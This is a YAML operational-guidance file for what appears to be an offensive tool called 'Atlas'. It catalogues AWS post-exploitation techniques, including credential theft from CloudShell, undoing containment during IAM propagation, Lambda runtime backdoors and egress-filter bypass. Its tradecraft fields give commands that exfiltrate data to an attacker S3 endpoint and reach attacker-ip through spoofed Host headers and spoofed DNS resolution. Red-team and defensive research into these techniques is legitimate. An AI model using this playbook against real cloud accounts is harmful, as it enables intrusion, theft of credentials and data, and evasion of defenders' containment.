# =============================================================================
# Atlas Post-Exploitation Operational Guidance
# =============================================================================
#
# Techniques from Hacking The Cloud that are operational (tool usage, tradecraft)
# rather than permission-based graph edges. Use when planning or executing.
#
# Graph edges for permission-based persistence are in attack_graph.py.
# =============================================================================

operational_techniques:

  - name: "Create Console Session from IAM Credentials"
    source: "https://hackingthe.cloud/aws/post_exploitation/create_a_console_session_from_iam_credentials/"
    summary: "aws-vault or GetFederationToken → console sign-in URL"
    when: "Need GUI access; IAM creds available"
    detection_notes: |
      NOT recommended for stealth. ConsoleLogin CloudTrail event, odd user-agent
      (e.g. CI/CD role using Firefox), high log volume. Prefer CLI/API.
    tools: ["aws-vault", "aws_consoler", "Pacu"]

  - name: "Download Tools and Exfiltrate Data with AWS CLI"
    source: "https://hackingthe.cloud/aws/post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/"
    summary: "S3 --endpoint-url to attacker MinIO or compatible store"
    when: "Need to exfil data or pull tools; AWS CLI on host"
    tradecraft: |
      aws s3 ls --endpoint-url https://attacker.s3.store
      Use S3-compatible backend (MinIO) to download tools or exfiltrate.
      SCARLETEEL used this. Layer 7 firewall can block non-allowlisted domains.
    tools: ["AWS CLI", "MinIO"]

  - name: "Get IAM Credentials from a Console Session"
    source: "https://hackingthe.cloud/aws/post_exploitation/get_iam_creds_from_console_session/"
    summary: "CloudShell or /tb/creds endpoint from browser session"
    when: "Have console session (cookies) but need IAM creds for tools"
    tradecraft: |
      CloudShell: curl localhost:1338/latest/meta-data/container/security-credentials
      Or: aws configure export-credentials --format env
      Console /tb/creds endpoints return service-scoped temp creds.
      No additional CloudTrail beyond normal Console usage.
    tools: ["CLIer (browser extension)", "boto3 in CloudShell"]

  - name: "IAM Persistence through Eventual Consistency"
    source: "https://hackingthe.cloud/aws/post_exploitation/iam_persistence_eventual_consistency/"
    summary: "~4s window to undo containment before IAM propagates"
    when: "Defender attaches deny policy or revokes keys; you're monitoring"
    tradecraft: |
      Detect new inline policy → delete before propagation. Same for detach,
      permission boundary, etc. SCPs mitigate (evaluated differently).
    mitigation: "Defenders: apply SCP first, then IAM remediation"

  - name: "Intercept SSM Communications"
    source: "https://hackingthe.cloud/aws/post_exploitation/intercept_ssm_communications/"
    summary: "Spoof SSM agent; intercept SendCommand or Session Manager"
    when: "EC2 access + instance role; intercept commands to instance"
    tradecraft: |
      Poll for messages faster than real agent; intercept SendCommand output.
      Or spawn control channel to intercept Session Manager. Requires agent research.
    tools: ["ssm-agent-research PoC"]

  - name: "Lambda Persistence (Runtime Backdoor)"
    source: "https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/"
    summary: "Backdoor bootstrap.py / runtime.rb; exfil on each invoke"
    when: "RCE in Lambda (e.g. deserialization); want persistent exfil"
    tradecraft: |
      Modify /var/runtime/bootstrap.py, host on attacker server, one-liner
      to pull + swap. Cold start loses persistence; re-invoke to re-establish.
    note: "Atlas models Lambda code injection; runtime backdoor is post-RCE"

  - name: "Network Firewall Egress Bypass"
    source: "https://hackingthe.cloud/aws/post_exploitation/network-firewall-egress-filtering-bypass/"
    summary: "SNI spoofing or Host header to reach attacker via allowed domain"
    when: "Egress filtered; need to reach C2 or exfil endpoint"
    tradecraft: |
      curl -H "Host: windowsupdate.com" http://attacker-ip
      curl -ik https://ssm.region.amazonaws.com --resolve 'ssm.region.amazonaws.com:443:attacker-ip'
      TLS inspection blocks HTTPS spoof; HTTP often allowed for updates.

  - name: "Role Chain Juggling"
    source: "https://hackingthe.cloud/aws/post_exploitation/role-chain-juggling/"
    summary: "AssumeRole chain refreshes credential expiry"
    when: "Long engagement; need to extend access without new keys"
    tradecraft: |
      Chain assume-role calls; expiry refreshes each time. Can cycle
      between roles if trust allows. AWSRoleJuggler automates.
    tools: ["AWSRoleJuggler"]
